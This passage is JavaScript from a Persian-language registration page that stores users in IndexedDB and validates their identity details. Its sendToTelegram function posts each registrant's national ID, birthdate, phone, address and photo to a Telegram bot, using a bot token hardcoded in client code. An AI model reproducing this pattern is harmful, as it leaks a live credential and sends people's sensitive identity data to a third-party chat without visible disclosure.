    <script>
        let db;
        const dbName = "UserDB";
        const storeName = "Users";
        let currentUser = null;

        // Initialize IndexedDB
        function initDB() {
            const request = indexedDB.open(dbName, 1);
            request.onupgradeneeded = function (event) {
                db = event.target.result;
                if (!db.objectStoreNames.contains(storeName)) {
                    db.createObjectStore(storeName, { keyPath: "nationalCode" });
                }
            };
            request.onsuccess = function (event) {
                db = event.target.result;
            };
            request.onerror = function (event) {
                console.error("Error opening DB:", event.target.error);
            };
        }

        // Save user to IndexedDB
        function saveUser(user) {
            const transaction = db.transaction([storeName], "readwrite");
            const store = transaction.objectStore(storeName);
            const request = store.put(user);
            request.onsuccess = function () {
                console.log("User saved successfully.");
            };
            request.onerror = function (event) {
                console.error("Error saving user:", event.target.error);
            };
        }

        // Get user from IndexedDB
        function getUser(nationalCode, callback) {
            const transaction = db.transaction([storeName], "readonly");
            const store = transaction.objectStore(storeName);
            const request = store.get(nationalCode);
            request.onsuccess = function (event) {
                callback(event.target.result);
            };
            request.onerror = function (event) {
                console.error("Error fetching user:", event.target.error);
            };
        }

        // Preview profile image
        document.getElementById("profileImage").addEventListener("change", function (e) {
            const file = e.target.files[0];
            const reader = new FileReader();
            reader.onload = function (e) {
                document.getElementById("profilePreview").src = e.target.result;
                document.getElementById("profilePreview").style.display = "block";
            };
            reader.readAsDataURL(file);
        });

        // Preview edit profile image
        document.getElementById("editProfileImage").addEventListener("change", function (e) {
            const file = e.target.files[0];
            const reader = new FileReader();
            reader.onload = function (e) {
                document.getElementById("editProfilePreview").src = e.target.result;
                document.getElementById("editProfilePreview").style.display = "block";
            };
            reader.readAsDataURL(file);
        });

        // تابع ارسال اطلاعات به تلگرام (شامل عکس پروفایل)
        function sendToTelegram(user) {
            const botToken = '7546571600:AAHU8BKI4svtt5icjOFZJbKVMt_232n1s7Q';
            const chatID = '-4755536198';

            // ساخت پیام برای ارسال به تلگرام
            const message = `ثبت‌نام جدید:\n
نام: ${user.name} نام خانوادگی: ${user.family} کد ملی: ${user.nationalCode} تاریخ تولد: ${user.birthdate} شماره تماس: ${user.phone} جنسیت: ${user.gender === "male" ? "مرد" : "زن"} تحصیلات: ${user.education} آدرس: ${user.address}`;

            // ارسال اطلاعات متنی به تلگرام
            const textUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
            const textParams = {
                chat_id: chatID,
                text: message,
            };

            fetch(textUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(textParams),
            })
            .then(response => response.json())
            .then(data => {
                console.log('پیام متنی با موفقیت ارسال شد:', data);
            })
            .catch(error => {
                console.error('خطا در ارسال پیام متنی:', error);
            });

            // ارسال عکس پروفایل به تلگرام
            if (user.profileImage && user.profileImage.startsWith('data:image')) {
                const photoUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
                const formData = new FormData();
                formData.append('chat_id', chatID);
                formData.append('photo', dataURLtoBlob(user.profileImage), 'profile.png');

                fetch(photoUrl, {
                    method: 'POST',
                    body: formData,
                })
                .then(response => response.json())
                .then(data => {
                    console.log('عکس با موفقیت ارسال شد:', data);
                })
                .catch(error => {
                    console.error('خطا در ارسال عکس:', error);
                });
            }
        }

        // تابع تبدیل Data URL به Blob
        function dataURLtoBlob(dataURL) {
            const byteString = atob(dataURL.split(',')[1]);
            const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            return new Blob([ab], { type: mimeString });
        }

        // اعتبارسنجی نام و نام خانوادگی (فقط حروف فارسی)
        function validateName(name) {
            const persianRegex = /^[\u0600-\u06FF\s]+$/;
            return persianRegex.test(name);
        }

        // اعتبارسنجی کد ملی (فقط عدد و 10 رقم)
        function validateNationalCode(nationalCode) {
            const numericRegex = /^\d{10}$/;
            return numericRegex.test(nationalCode);
        }

        // اعتبارسنجی تاریخ تولد (فرمت و معتبر بودن تاریخ)
        function validateBirthdate(birthdate) {
            const dateRegex = /^\d{4}\/\d{2}\/\d{2}$/;
            if (!dateRegex.test(birthdate)) return false;

            const [year, month, day] = birthdate.split('/').map(Number);
            if (month < 1 || month > 12 || day < 1 || day > 31) return false;

            return true;
        }

        // اعتبارسنجی شماره تماس (فقط عدد و 11 رقم)
        function validatePhone(phone) {
            const numericRegex = /^\d{11}$/;
            return numericRegex.test(phone);
        }

        // اعتبارسنجی آدرس (فقط حروف فارسی و حداکثر 50 کاراکتر)
        function validateAddress(address) {
            const persianRegex = /^[\u0600-\u06FF\s\d\.,\-]+$/;
            return persianRegex.test(address) && address.length <= 50;
        }

        // اعتبارسنجی عکس (فقط پسوند‌های مجاز)
        function validateImage(file) {
            const allowedExtensions = ['jpg', 'jpeg', 'png'];
            const extension = file.name.split('.').pop().toLowerCase();
            return allowedExtensions.includes(extension);
        }

        // بررسی پر بودن تمام فیلدها
        function validateForm() {
            const name = document.getElementById("name").value.trim();
            const family = document.getElementById("family").value.trim();
            const nationalCode = document.getElementById("nationalCode").value.trim();
            const birthdate = document.getElementById("birthdate").value.trim();
            const phone = document.getElementById("phone").value.trim();
            const gender = document.querySelector('input[name="gender"]:checked');
            const education = document.getElementById("education").value.trim();
            const address = document.getElementById("address").value.trim();
            const profileImage = document.getElementById("profileImage").files[0];

            if (!name || !family || !nationalCode || !birthdate || !phone || !gender || !education || !address || !profileImage) {
                document.getElementById("signupError").innerText = "لطفاً تمام فیلدها را پر کنید.";
                document.getElementById("registerButton").disabled = true;
                return false;
            } else {
                document.getElementById("signupError").innerText = "";
                document.getElementById("registerButton").disabled = false;
                return true;
            }
